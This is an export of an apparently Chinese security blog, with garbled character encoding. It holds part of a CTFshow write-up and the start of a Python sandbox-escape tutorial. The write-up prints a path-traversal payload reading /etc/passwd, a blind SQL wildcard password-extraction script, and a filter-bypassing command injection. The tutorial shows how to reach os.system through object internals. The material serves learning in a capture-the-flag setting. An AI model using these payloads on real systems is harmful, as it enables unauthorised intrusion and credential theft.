class="params">id</span>):</span></span><br><span class="line">    <span class="comment"># print(id)</span></span><br><span class="line">    d =<span class="string">&#x27;0e&#x27;</span>+str(id)+<span class="string">&#x27;48399&#x27;</span></span><br><span class="line">    enc=md2(md2(d))</span><br><span class="line">    <span class="keyword">if</span> enc[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> enc[<span class="number">2</span>:<span class="number">-1</span>].isdigit():</span><br><span class="line">        print(d)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">9999</span>):</span><br><span class="line">    check(i)</span><br></pre></td></tr></table></figure><p>è·‘å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b &#x3D; 0e652024452   c &#x3D; 0e603448399</span><br></pre></td></tr></table></figure><p>æœ€åä¸€å…³ï¼Œphpä¼šå°†ä¸è®¤è¯†çš„åè®®å½“ä½œç›®å½•ï¼Œpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;1e-300&amp;b&#x3D;0e652024452&amp;c&#x3D;0e603448399</span><br><span class="line">POST: url&#x3D;a:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>éœ€è¦è·³5å±‚ <code>a</code>ä¸€å±‚ <code>ctfshow.com</code>ä¸€å±‚</p><h3 id="web3-è«è´Ÿå©µå¨Ÿ"><a href="#web3-è«è´Ÿå©µå¨Ÿ" class="headerlink" title="web3_è«è´Ÿå©µå¨Ÿ"></a>web3_è«è´Ÿå©µå¨Ÿ</h3><p>æŸ¥çœ‹æºç å‘ç°ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span><br></pre></td></tr></table></figure><p>fuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; # \ %</span><br></pre></td></tr></table></figure><p>éƒ½è¿‡æ»¤äº†ï¼Œé—­åˆsqlè¯­å¥æ³¨å…¥åº”è¯¥ä¸è¡Œäº†ï¼Œå†çœ‹ä¸‹å‘ç°æ¯”è¾ƒæ—¶æ˜¯<code>like</code>ï¼Œæƒ³åˆ°sqlé€šé…ç¬¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%ï¼šç”¨æ¥è¡¨ç¤ºä»»æ„å¤šä¸ªå­—ç¬¦ï¼Œå¯ä»¥ä¸º0</span><br><span class="line"></span><br><span class="line">_  : ç”¨æ¥è¡¨ç¤ºä»»æ„å•ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure><p>å‘ç°å½“æœ‰32ä¸ª<code>_</code>æ—¶çŠ¶æ€æ”¹å˜äº†</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200928142411.png"></p><p>æˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬è·‘ä¸‹å¯†ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://04c9162c-4824-4247-8d26-743472a723a6.chall.ctf.show/login.php&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        print(i,j)</span><br><span class="line">        p = flag+j+(<span class="number">32</span>-i)*<span class="string">&#x27;_&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p&#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag== f:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 67815b0c009ee970fe4014abaa3Fa6A0</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æœ€åä¸€ä½è·‘å‡ºæ¥çš„æ—¶å€™ä¼šç™»å½•æˆåŠŸï¼ŒçŠ¶æ€ä¸ä¸€æ ·</p><p>ç™»é™†è¿›å»å‘ç°æ˜¯ä¸ªcurlçš„åŠŸèƒ½ï¼ŒçŒœæµ‹æ˜¯å‘½ä»¤æ³¨å…¥ï¼Œfuzzä¸€ä¸‹ è¿‡æ»¤äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°å†™å­—æ¯ | () &#x2F; \ &#96; * , &lt; &gt; !</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ è¿™äº›æ²¡è¿‡æ»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? $ &#123; &#125; :</span><br></pre></td></tr></table></figure><p>å¤§å†™å­—æ¯æ²¡è¿‡æ»¤ï¼Œè€Œä¸€äº›linuxçš„å¸¸é‡éƒ½æ˜¯å¤§å†™å­—æ¯ï¼Œå¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$PATH  linuxç¯å¢ƒå˜é‡</span><br><span class="line">$HOME  ç”¨æˆ·ä¸»ç›®å½•</span><br><span class="line">$PWD   å½“å‰è·¯å¾„</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥å¸¦å‡ºè¿™å˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;1.1.1.1:9000?$PATH</span><br></pre></td></tr></table></figure><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200928151434.png"></p><p>ç„¶åæˆªå–æ‹¼æ¥å°±è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;127.0.0.1;$&#123;PATH:7:1&#125;$&#123;PATH:8:1&#125;$&#123;HOME:12:1&#125; ????.???</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> wirteup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonæ²™ç®±é€ƒé€¸</title>
      <link href="2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†pythonæ²™ç®±é€ƒé€¸çš„ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="æ²™ç®±é€ƒé€¸çš„æ¦‚å¿µ"><a href="#æ²™ç®±é€ƒé€¸çš„æ¦‚å¿µ" class="headerlink" title="æ²™ç®±é€ƒé€¸çš„æ¦‚å¿µ"></a>æ²™ç®±é€ƒé€¸çš„æ¦‚å¿µ</h2><p>æ²™ç®±é€ƒé€¸ï¼Œå°±æ˜¯åœ¨ç»™æˆ‘ä»¬çš„ä¸€ä¸ªä»£ç æ‰§è¡Œç¯å¢ƒä¸‹(Ojæˆ–ä½¿ç”¨socatç”Ÿæˆçš„äº¤äº’å¼ç»ˆç«¯),è„±ç¦»ç§ç§è¿‡æ»¤å’Œé™åˆ¶,æœ€ç»ˆæˆåŠŸæ‹¿åˆ°shellæƒé™çš„è¿‡ç¨‹ã€‚</p><h2 id="å‘½åç©ºé—´"><a href="#å‘½åç©ºé—´" class="headerlink" title="å‘½åç©ºé—´"></a>å‘½åç©ºé—´</h2><p>åç©ºé—´æ˜¯åç§°åˆ°å¯¹è±¡çš„æ˜ å°„ï¼›æŒ‰ç…§å˜é‡å®šä¹‰çš„ä½ç½®ï¼Œæœ‰ä»¥ä¸‹åˆ†ç±»ï¼š</p><ul><li>Localï¼Œå±€éƒ¨å‘½åç©ºé—´ï¼Œæ¯ä¸ªå‡½æ•°æ‰€æ‹¥æœ‰çš„å‘½åç©ºé—´ï¼Œè®°å½•äº†å‡½æ•°ä¸­å®šä¹‰çš„æ‰€æœ‰å˜é‡</li><li>Globalï¼Œå…¨å±€å‘½åç©ºé—´ï¼Œæ¯ä¸ªæ¨¡å—åŠ è½½æ‰§è¡Œæ—¶åˆ›å»ºçš„ï¼Œè®°å½•äº†æ¨¡å—ä¸­å®šä¹‰çš„å˜é‡</li><li>Built-inï¼Œå†…å»ºå‘½åç©ºé—´ï¼Œä»»ä½•æ¨¡å—å‡å¯è®¿é—®</li></ul><p>ä¸Šè¿°ä¸‰ç§å‘½åç©ºé—´çš„ç”Ÿå‘½å‘¨æœŸå¦‚ä¸‹ï¼š</p><ul><li>Localï¼Œåœ¨å‡½æ•°è°ƒç”¨æ—¶æ‰è¢«åˆ›å»ºï¼Œå½“å‡½æ•°è¿”å›ç»“æœæˆ–æŠ›å‡ºå¼‚å¸¸æ—¶è¢«åˆ é™¤</li><li>Globalï¼Œåœ¨æ¨¡å—åŠ è½½æ—¶è¢«åˆ›å»ºï¼Œä¸€ç›´ä¿ç•™åˆ°pythonè§£é‡Šå™¨é€€å‡º</li><li>Built-inï¼Œåœ¨pythonè§£é‡Šå™¨å¯åŠ¨æ—¶åˆ›å»ºï¼Œä¸€ç›´ä¿ç•™åˆ°pythonè§£é‡Šå™¨é€€å‡º</li></ul><p>åƒ<code>len</code>ï¼Œ<code>print</code>è¿™äº›å‡½æ•°ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦å¼•å…¥æ¨¡å—è€Œç›´æ¥å¯ä»¥å»è°ƒç”¨ï¼Œå› æ­¤è¿™äº›å‡½æ•°éƒ½æ¥è‡ªå†…å»ºå‘½åç©ºé—´</p><h2 id="å¸¸ç”¨çš„å†…å»ºå±æ€§"><a href="#å¸¸ç”¨çš„å†…å»ºå±æ€§" class="headerlink" title="å¸¸ç”¨çš„å†…å»ºå±æ€§"></a>å¸¸ç”¨çš„å†…å»ºå±æ€§</h2><h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><p><code>__class__</code>åŒ<code>type()</code>ï¼Œéƒ½å¯æŸ¥çœ‹å¯¹è±¡æ‰€åœ¨çš„ç±»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Student</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.name = name</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu = Student(<span class="string">&#x27;ling&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(stu)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Student</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">stu</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Student</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><h3 id="base"><a href="#base" class="headerlink" title="__base__"></a><code>__base__</code></h3><p>å¯ä»¥è·å–ç±»çš„ä¸€ä¸ªåŸºç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯objectï¼Œæœ‰æ—¶ä¸æ˜¯ï¼Œä¾‹å¦‚ç»§æ‰¿ç±»çš„æ—¶å€™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Student</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.name = name</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu = Student(<span class="string">&#x27;ling&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">class</span> <span class="title">Student2</span>(<span class="params">Student</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu2 = Student2()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu2.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Student</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h3><p>ä»¥å…ƒç¥–çš„å½¢å¼è¿”å›æ•´ä¸ªç»§æ‰¿é“¾çš„å…³ç³»ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu2.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;__main__.Student2&#x27;&gt;, &lt;class &#x27;__main__.Student&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¾ç¤ºäº†<code>Student2</code>ç»§æ‰¿è‡ª<code>Student</code>ï¼Œ<code>Student</code>ç»§æ‰¿è‡ª<code>object</code>ï¼›å› æ­¤å¯ä»¥ç›´æ¥è·å–objectç±»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu2.__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a><code>__subclasses__()</code></h3><p>ä¸Šè¿°ä¸¤ç§æ–¹æ³•å¯ä»¥å¾—åˆ°objectç±»ï¼Œä½†å¦‚æœä»£ç ä¸­æ²¡æœ‰Studentç±»ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åˆ©ç”¨pythonè‡ªå¸¦çš„å¯¹è±¡(ä¸€åˆ‡çš†ä¸ºå¯¹è±¡)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span>.<span class="title">__base__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°objectç±»åï¼Œå°±å¯ä»¥ç”¨<code>__subclasses__()</code>æ–¹æ³•è·å¾—æ‰€æœ‰ç»§æ‰¿æ­¤ç±»çš„å­ç±»ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;......</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šæ²¡æœ‰é™åˆ¶çš„è¯ï¼Œ<code>object</code>ç±»æ˜¯ç›´æ¥å¯ä»¥ä½¿ç”¨çš„</p><h3 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h3><p>æˆ‘ä»¬åœ¨è·å¾—åˆ°ä¸€ä¸ªæ¨¡å—æ—¶æƒ³è°ƒç”¨æ¨¡å—ä¸­çš„æ–¹æ³•ï¼Œæ°å¥½è¯¥æ–¹æ³•è¢«è¿‡æ»¤äº†ï¼Œå°±å¯ä»¥ç”¨è¯¥æ–¹æ³•bypass</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__dict__[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ystem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br></pre></td></tr></table></figure><p>ä¸dir()ä½œç”¨ç›¸åŒï¼Œéƒ½æ˜¯è¿”å›å±æ€§ã€æ–¹æ³•ç­‰ï¼›ä½†ä¸€äº›æ•°æ®ç±»å‹æ˜¯æ²¡æœ‰<code>__dict__</code>å±æ€§çš„ï¼Œå¦‚<code>[].__dict__</code>ä¼šè¿”å›é”™è¯¯</p><p><code>__dict__</code>åªä¼šæ˜¾ç¤ºå±äºè‡ªå·±çš„å±æ€§ï¼Œdir()é™¤äº†æ˜¾ç¤ºè‡ªå·±çš„å±æ€§ï¼Œè¿˜æ˜¾ç¤ºä»çˆ¶ç±»ç»§æ‰¿æ¥çš„å±æ€§</p><p>å¯ä»¥ä½¿ç”¨<code>__dict__</code>æ¥é—´æ¥è°ƒç”¨ä¸€äº›å±æ€§æˆ–æ–¹æ³•ï¼Œå¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__dict__[<span class="string">&#x27;append&#x27;</span>](a, <span class="string">&#x27;ling&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="string">&#x27;ling&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="init"><a href="#init" class="headerlink" title="__init__"></a><code>__init__</code></h3><p><code>__init__</code>ç”¨äºåˆå§‹åŒ–ç±»ï¼Œåœ¨æ²™ç›’é€ƒé€¸ä¸­çš„ä½œç”¨å°±æ˜¯ä¸ºäº†å¾—åˆ°<code>function</code>/<code>method</code>ç±»å‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, a, b</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.a = a</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Base</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Child</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Child</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; </span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">__init__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">__init__</span> <span class="title">at</span> 0<span class="title">x7f40d32ed268</span>&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">func</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">func</span> <span class="title">at</span> 0<span class="title">x7f40d32ed2f0</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p>è¯¥å±æ€§æ˜¯å‡½æ•°/æ–¹æ³•ç‰¹æœ‰çš„å±æ€§ï¼Œè®°å½•å½“å‰æ–‡ä»¶çš„å…¨å±€å˜é‡çš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(func)</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>, <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu = Student()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__</span><br><span class="line">&lt;bound method Student.__init__ of &lt;__main__.Student instance at <span class="number">0x7fba95e03cb0</span>&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__.__globals__</span><br><span class="line">&#123;&#x27;func&#x27;: &lt;function func at 0x7fba95db5d70&gt;, &#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__package__&#x27;: None, &#x27;stu&#x27;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &#x27;Student&#x27;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, 